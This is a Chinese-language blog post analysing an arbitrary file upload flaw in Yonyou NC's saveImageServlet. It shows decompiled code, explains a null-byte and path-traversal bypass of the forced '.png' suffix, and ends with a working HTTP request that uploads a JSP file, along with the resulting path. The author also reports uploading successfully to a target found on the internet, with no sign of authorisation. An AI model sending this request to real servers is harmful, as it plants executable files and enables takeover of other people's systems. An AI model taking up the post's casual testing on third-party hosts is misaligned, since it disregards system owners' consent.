#  用友NC saveImageServlet 文件上传漏洞分析   
原创 莫大130  安全逐梦人   2024-04-11 20:41  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrcSicO9uTsRXLaibQjycXGfdwZJmmaSerFwwfbRA70TccJA6R37JJq3qA/640?wx_fmt=png&from=appmsg "")  
  
官方更新了一个漏洞，  
NC系统的saveImageServlet接口中的filename参数缺乏校验导致任意文件上传，分析一下  
  
在idea 搜索 saveImageServlet 接口位置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrvxsVrFBqXCOfsd9AM7W4ia5MyvYFUNXM7bhd8AfXQFxJhibPn12nQ90g/640?wx_fmt=png&from=appmsg "")  
```
package nc.uap.wfm.action;


@Servlet(path="/servlet/saveImageServlet")
public class SaveImageServlet
extends WfBaseServlet {
    private static final long serialVersionUID = -5603687395645617927L;

    @Action(method="POST")
    public void doPost() throws ServletException, IOException {
        this.response.setContentType("application/octet-stream");
        String filename = this.request.getParameter("filename");
        if (filename == null || "".equals(filename)) {
            filename = UUID.randomUUID().toString();
        }
        filename = filename + ".png";
        String savePath = this.request.getRealPath("") + "/processxml/images/" + filename;
        ServletInputStream is = this.request.getInputStream();
        FilterOutputStream dos = null;
        try {
            int size = 0;
            byte[] tmp = new byte[10240];
            File f = new File(savePath);
            dos = new DataOutputStream(new FileOutputStream(f));
            int len = -1;
            while ((len = is.read(tmp)) != -1) {
                ((DataOutputStream)dos).write(tmp, 0, len);
                size += len;
            }
            ((DataOutputStream)dos).flush();
            dos.close();
        }
        catch (IOException e) {
            WfmLogger.error((String)e.getMessage(), (Throwable)e);
            throw new LfwRuntimeException(e.getMessage());
        }
        finally {
            try {
                if (is != null) {
                    is.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
            try {
                if (dos != null) {
                    dos.close();
                }
            }
            catch (Exception e) {
                WfmLogger.error((Throwable)e);
            }
        }
    }
}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrDmm2bpIibhuXhvltQsQltK7ib4XXWntpqCzDHARMMQAwoL9ClHWjiaTbA/640?wx_fmt=png&from=appmsg "")  
  
从代码上看，上传文件名进行了处理，  
filename = filename + ".png";  
   将后缀拼接上了.png格式然后将文件上传，因为强制加上了.png，按道理来说是不存在漏洞的  
  
  
本地我也进行测试了，基本上不可以，上传的文件都被强制加上了png  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrfwWiaQ7RtrSYLdl4vFUkHogMLQoiakqER904MiaJOYYaf3p45f4geny9A/640?wx_fmt=png&from=appmsg "")  
  
  
  
想起来之前网上放出poc中利用Windows特性， 加上   
%00  
 就成功上传了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHruxlyewyV0mO6ZPSZBXaoUCoe72YbpGH6ricQMoegUibBC3N6LCHIcNkA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrawt3KyiaDMSmlSX7CHJnnlK7lgIgk2NPHQmHqQsoyqEFgud63UgXCnA/640?wx_fmt=png&from=appmsg "")  
  
  
但是我本地搭建的环境也没成功, Windows2016 可能版本太高了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrObZu6GKyNibbKicQb1ibSSN9Pmf9WaORvAfoUWkjr4Ih7Fb8kLDf5BNGw/640?wx_fmt=png&from=appmsg "")  
  
返回500  没有上传成功  
  
正常上传jsp文件试试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrmPj1nVqNLRcjtNBzeicnFjGeRQg3XF7Iarvcxsoht2XOibtA2fZTQUXA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHromQOleia1eEriauoic6XVefPlEcvk8QTPUmOUbBVeT0MjwVVicGic38HCSg/640?wx_fmt=png&from=appmsg "")  
  
都加上了.png后缀  
  
  
从网上找了目标测试 成功上传  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrnylicgGzG43bxpbcX1BVlleO5FDAyMpe3K3piaH6Nha6AVWE7JzcFNWQ/640?wx_fmt=png&from=appmsg "")  
  
说明了这个漏洞  
要是  
目标的  
Windows版本太高了，就不能利用成功的，起码我的环境  
Windows2016 是没有成功。  
  
  
附上数据包  
```
POST /portal/pt/servlet/saveImageServlet/doPost?pageId=login&filename=../1.jsp%00 HTTP/1.1
Host: 5
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 19

111
```  
  
  
文件上传路径http://ip:port/portal/processxml/1.jsp  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vOGOib9z4Wz6kAqAmLYKy8uZia1RtckEHrS3uPUrjhTPy7jILzSdRv98TvvCQpQJyPXKkY3PjpMfEZVCtL8UH8yA/640?wx_fmt=jpeg&from=appmsg "")  
  
